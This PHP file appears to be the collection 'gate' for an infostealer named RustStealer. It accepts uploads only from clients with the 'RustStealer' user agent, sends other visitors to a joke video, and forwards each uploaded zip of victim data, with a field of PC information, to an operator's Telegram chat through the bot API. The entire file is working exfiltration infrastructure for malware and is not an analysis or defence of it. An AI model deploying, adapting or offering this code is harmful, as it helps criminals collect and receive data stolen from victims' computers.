<?php
$ipTimestamps = [];

$ipAddress = $_SERVER['REMOTE_ADDR'];

if (array_key_exists($ipAddress, $ipTimestamps)) {
 $timeDifference = time() - $ipTimestamps[$ipAddress];

 // If the difference is less than 600 seconds (10 minutes), don't allow the request
 if ($timeDifference < 600) {
     http_response_code(429);
     exit;
 }
}

// Your Telegram bot token
$botToken = "";
// Your Telegram chat ID
$chatId = "";

try {
   // Check for the correct user agent
   if ($_SERVER['HTTP_USER_AGENT'] != 'RustStealer') {
       header("Location: https://www.youtube.com/watch?v=dQw4w9WgXcQ"); // HAHAHHAH BIG MEME
       exit;
   }

   if (isset($_FILES['file']) && isset($_POST['buffer_pc_info'])) {
       $file = $_FILES['file'];
       $buffer_pc_info = $_POST['buffer_pc_info'];

       $url = "https://api.telegram.org/bot" . $botToken . "/sendDocument?chat_id=" . $chatId;
       $post_fields = array(
           'document' => new CURLFile($file['tmp_name'], 'application/zip', $file['name']),
           'caption' => "\nRustStealer Gate\n" . $buffer_pc_info,
       );
       
       $ch = curl_init(); 
       curl_setopt($ch, CURLOPT_HTTPHEADER, array(
           "Content-Type:multipart/form-data"
       ));
       curl_setopt($ch, CURLOPT_URL, $url); 
       curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
       curl_setopt($ch, CURLOPT_POST, 1); 
       curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
       $output = curl_exec($ch);

   } else {
       http_response_code(400);
   }

   http_response_code(200);
} catch (Exception $e) {
   // Send error message to the Telegram channel
   $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId;
   $post_fields = array(
       'chat_id' => $chatId,
       'text' => 'An error occurred: ' . $e->getMessage(),
   );

   $ch = curl_init(); 
   curl_setopt($ch, CURLOPT_HTTPHEADER, array(
       "Content-Type:multipart/form-data"
   ));
   curl_setopt($ch, CURLOPT_URL, $url); 
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
   curl_setopt($ch, CURLOPT_POST, 1); 
   curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); 
   $output = curl_exec($ch);
}

$ipTimestamps[$ipAddress] = time();
?>
